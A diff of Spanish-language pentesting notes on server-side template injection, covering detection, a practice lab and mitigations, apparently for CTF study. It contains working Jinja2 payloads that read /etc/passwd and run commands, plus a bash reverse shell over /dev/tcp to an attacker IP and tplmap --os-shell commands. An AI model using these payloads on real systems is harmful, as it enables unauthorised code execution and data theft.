@@ -1,92 +1,120 @@
+# Server-Side Template Injection (SSTI)
+
+SSTI es una vulnerabilidad que aparece cuando el input del usuario se embebe directamente en una **plantilla de servidor** sin ser sanitizado. Los motores de plantillas están diseñados para ejecutar código, por lo que si un atacante puede inyectar expresiones en ellos, puede obtener ejecución de código en el servidor.
+
+A diferencia de XSS (que afecta al navegador del cliente), SSTI ataca directamente los componentes internos del servidor.
+
 ---
-tags:
-  - Web
-  - Explotacion
-  - "#SSTI"
+
+## Motores de plantillas populares
+
+| Lenguaje | Motores |
+|---|---|
+| PHP | Smarty, Twig |
+| Java | Velocity, FreeMarker |
+| Python | Jinja2, Mako, Tornado |
+| JavaScript | Jade, Pug |
+| Ruby | Liquid |
+
 ---
 
-# Notas
+## Detección
 
-Para resumirlo rápidamente, SSTI es una vulnerabilidad que aprovecha una implementación insegura de un motor de plantillas (template engine). Los motores de plantilla son empleado por las aplicaciones web para la presentación de datos dinámicos.
-Por lo general, a menudo muchas inserciones de los usuarios que son posteriormente reflejadas en la respuesta de la aplicación web son interpretadas como vulnerabilidades de Cross-Site Scripting (XSS), sin embargo a través del aprovechamiento de esta vulnerabilidad es posible atacar directamente a los componentes internos del servidor web del objetivo.
-Algunos motores de plantilla populares son los siguientes:
+El payload de detección universal es una expresión matemática:
 
-- **PHP**: Smarty, Twig
-- **Java**: Velocity, FreeMarker
-- **Python**: Jinja, Mako, Tornado
-- **JavaScript**: Jade, Rage
-- **Ruby**: Liquid
-
-
-## Python Flask
-
-Siempre que veamos una página web que por debajo este funcionando en python y/o flask podemos realizar lo siguiente:
-
-Comprobar que trabaja por detrás:  **TAMBIEN SE USA WAPPALYZER**
-
-```bash
-whatweb 127.0.0.1:80
-
-# RESULTADO
-http://127.0.0.1:8089 [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.9.13], IP[127.0.0.1], Python[3.9.13], Title[SSTI demo app], Werkzeug[2.2.2]
-```
-
-Dentro de un formulario introducciones lo siguiente:
 ```
 {{7*7}}
 ```
-Si vemos en la respuesta vemos el resultado de la operación, esto quiere decir que es vulnerable.
 
-También podemos hacer las siguientes consultas:  (MUESTRA 7 VECES 7)
+Si la respuesta muestra `49` en lugar de `{{7*7}}`, el motor de plantillas está evaluando el input — la aplicación es vulnerable.
+
+Otros payloads de detección para identificar el motor:
+
 ```
-{{'7'*7}}
+{{7*7}}          → Jinja2, Twig
+${7*7}           → FreeMarker, Velocity
+<%= 7*7 %>       → ERB (Ruby)
+#{7*7}           → Ruby
+*{7*7}           → Spring (Java)
 ```
 
-**CON ESTO PODEMOS EJECUTAR CODIGO MALICIOSO**
+```
+{{'7'*7}}        → En Jinja2: devuelve '7777777'
+```
 
-Podemos ir a la página https://github.com/swisskyrepo/PayloadsAllTheThings
-Aquí buscamos la vulnerabilidad y vemos que tenemos payloads para usar.
+**Herramientas de detección:** [Wappalyzer](https://www.wappalyzer.com) o `whatweb` para identificar el stack tecnológico:
 
-**LEER ARCHIVOS**
+```bash
+whatweb http://target.com
+```
+
+---
+
+## Explotación — Python / Jinja2 (Flask)
+
+Jinja2 (usado por Flask) es el caso más frecuente en CTF y entornos de pentesting.
+
+### Leer archivos del sistema
 
 ```python
 {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
-**Para ejecutar comandos:**
+### Ejecutar comandos
 
 ```python
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
+### Reverse shell
 
-**Para enviarnos una reverse shell**
+Primero, poner el listener en escucha:
+```bash
+nc -nlvp 443
+```
+
+Luego inyectar el payload (el `%26` es `&` URL-encoded):
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/<IP_ATACANTE>/443 0>%261"').read() }}
+```
+
+---
+
+## Payloads para otros motores
+
+La referencia más completa de payloads por motor está en:
+- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/)
+
+---
+
+## Herramientas de automatización
+
+### tplmap
+
+Automatiza la detección y explotación de SSTI en múltiples motores:
 
 ```bash
-sudo nc -nlvp 433
+python3 tplmap.py -u "http://target.com/page?name=test"
+python3 tplmap.py -u "http://target.com/page?name=test" --os-shell
 ```
 
-```python
-{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/192.168.1.149/433 0>%261"').read() }}
-```
-# Hack4u
+---
 
-El **Server-Side Template Injection** (**SSTI**) es una vulnerabilidad de seguridad en la que un atacante puede inyectar código malicioso en una **plantilla** de servidor.
-
-Las plantillas de servidor son archivos que contienen código que se utiliza para generar **contenido dinámico** en una aplicación web. Los atacantes pueden aprovechar una vulnerabilidad de SSTI para inyectar código malicioso en una plantilla de servidor, lo que les permite ejecutar comandos en el servidor y obtener acceso no autorizado tanto a la aplicación web como a posibles datos sensibles.
-
-Por ejemplo, imagina que una aplicación web utiliza plantillas de servidor para generar correos electrónicos personalizados. Un atacante podría aprovechar una vulnerabilidad de **SSTI** para inyectar código malicioso en la plantilla de correo electrónico, lo que permitiría al atacante ejecutar comandos en el servidor y obtener acceso no autorizado a los datos sensibles de la aplicación web.
-
-En un caso práctico, los atacantes pueden detectar si una aplicación Flask está en uso, por ejemplo, utilizando herramientas como **WhatWeb**. Si un atacante detecta que una aplicación **Flask** está en uso, puede intentar explotar una vulnerabilidad de **SSTI**, ya que Flask utiliza el motor de plantillas **Jinja2**, que es vulnerable a este tipo de ataque.
-
-Para los atacantes, detectar una aplicación Flask o Python puede ser un primer paso en el proceso de intentar explotar una vulnerabilidad de SSTI. Sin embargo, los atacantes también pueden intentar identificar vulnerabilidades de SSTI en otras aplicaciones web que utilicen diferentes frameworks de plantillas, como Django, Ruby on Rails, entre otros.
-
-Para prevenir los ataques de SSTI, los desarrolladores de aplicaciones web deben validar y filtrar adecuadamente la entrada del usuario y utilizar herramientas y frameworks de plantillas seguros que implementen medidas de seguridad para prevenir la inyección de código malicioso.
-
-# Laboratorio
-
-## Lab 1
+## Laboratorio para practicar
 
 ```bash
 docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
 ```
+
+Acceder en `http://localhost:8089` y probar los payloads de Jinja2.
+
+---
+
+## Mitigaciones
+
+- **No embeber input del usuario directamente en plantillas** — es la causa raíz
+- Usar funciones de renderizado con entornos de sandbox (ej. `jinja2.sandbox.SandboxedEnvironment`)
+- Validar y escapar el input antes de pasarlo al motor de plantillas
+- Aplicar el principio de mínimo privilegio al proceso web
+- Revisar qué variables del contexto son accesibles desde la plantilla
